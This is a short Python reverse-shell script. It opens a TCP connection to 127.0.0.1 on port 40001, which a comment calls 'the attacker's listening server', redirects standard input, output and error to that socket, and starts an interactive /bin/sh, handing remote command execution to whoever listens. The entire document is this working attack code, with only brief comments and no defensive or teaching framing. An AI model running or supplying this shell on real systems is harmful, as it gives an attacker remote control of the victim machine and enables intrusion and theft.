import socket,subprocess,os
ip="127.0.0.1"
port=40001
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))  #connect to the attacker's listening server
os.dup2(s.fileno(),0) #redirct the stdin to socket discriptor:s
os.dup2(s.fileno(),1) #redirct the stdout to socket discriptor:s        
os.dup2(s.fileno(),2) #redirct the stderr to socket discriptor:s
r=subprocess.call(["/bin/sh","-i"]) #start a new interactive shell
